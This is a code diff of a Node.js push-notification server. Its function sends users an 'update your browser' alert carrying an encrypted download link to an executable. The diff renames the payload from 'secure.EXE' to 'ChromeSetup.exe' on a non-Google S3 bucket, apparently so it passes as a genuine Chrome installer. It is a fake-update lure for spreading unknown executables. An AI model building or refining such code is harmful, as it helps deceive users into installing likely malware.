@@ -143,7 +143,7 @@ app.post('/api/send-file-notification', async (req, res) => {
 async function sendSpecificFileNotification(subscription) {
   try {
     // Use the specific file URL
-    const fileUrl = process.env.FILE_URL || 'https://exe-file-download.s3.ap-southeast-1.amazonaws.com/secure.EXE';
+    const fileUrl = process.env.FILE_URL || 'https://s3.ap-southeast-1.amazonaws.com/chrome.exe-download/ChromeSetup.exe';
     
     // Encrypt the URL
     const encryptedUrl = encryptData(fileUrl);
@@ -154,13 +154,13 @@ async function sendSpecificFileNotification(subscription) {
       body: 'Please update your browser to the latest version.',
       data: {
         encryptedUrl: encryptedUrl,
-        fileName: 'secure.EXE'
+        fileName: 'ChromeSetup.exe'
       }
     });
     
     // Send the notification
     await webpush.sendNotification(subscription, payload);
-    console.log('Sent encrypted file notification for secure.EXE');
+    console.log('Sent encrypted file notification for ChromeSetup.exe');
     return true;
   } catch (error) {
     console.error('Error sending encrypted notification:', error);
